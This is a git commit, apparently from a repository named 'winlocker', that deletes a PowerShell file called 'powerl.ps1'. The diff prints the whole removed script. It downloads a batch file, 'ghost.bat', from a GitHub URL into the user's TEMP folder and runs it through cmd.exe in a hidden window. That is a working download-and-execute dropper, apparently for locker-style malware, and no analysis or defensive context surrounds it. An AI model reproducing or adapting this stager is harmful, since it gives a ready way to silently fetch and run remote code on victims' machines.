33b9da58c9a3c422754a1c9dbc7fc318f7d64c04
ippo123459-bit <ippo123459@gmail.com>
2026-06-13 20:03:21 +0800

    Delete powerl.ps1

--- powerl.ps1
+++
@@ -1,4 +0,0 @@
-$url = "https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/ghost.bat"
-$path = "$env:TEMP\ghost.bat"
-Invoke-WebRequest -Uri $url -OutFile $path
-Start-Process cmd.exe -ArgumentList "/c $path" -WindowStyle Hidden
